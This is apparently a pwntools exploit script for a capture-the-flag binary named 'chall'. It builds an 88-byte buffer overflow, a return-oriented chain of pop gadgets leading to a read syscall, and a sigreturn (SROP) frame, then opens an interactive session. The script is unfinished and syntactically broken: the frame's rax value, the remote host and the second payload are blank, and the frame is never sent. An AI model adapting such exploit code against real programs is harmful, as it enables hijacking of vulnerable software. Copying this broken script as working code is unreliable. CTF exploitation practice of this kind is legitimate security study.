#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

                b*0x401073
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
pop_rax = 0x0000000000401085
pop_rdi = 0x000000000040107f
pop_rsi = 0x0000000000401081
pop_rdx = 0x0000000000401083
syscall = 0x000000000040100a
frame = SigreturnFrame()
frame.rax = 
frame.rdi = 0
frame.rsi = 0x402950
frame.rdx = 0x100
frame.rsp = 0x402950
frame.rip = syscall
pay = b"a" * 88
pay += flat(
    pop_rax, 0x0,
    pop_rdi, 0,
    pop_rsi, 0x402950,
    pop_rdx, 0x500,
    syscall,
    0x402950
)
sa(b"Enter message: ", pay)
payload = flat(
        
)
sla(pay, payload)
p.interactive()
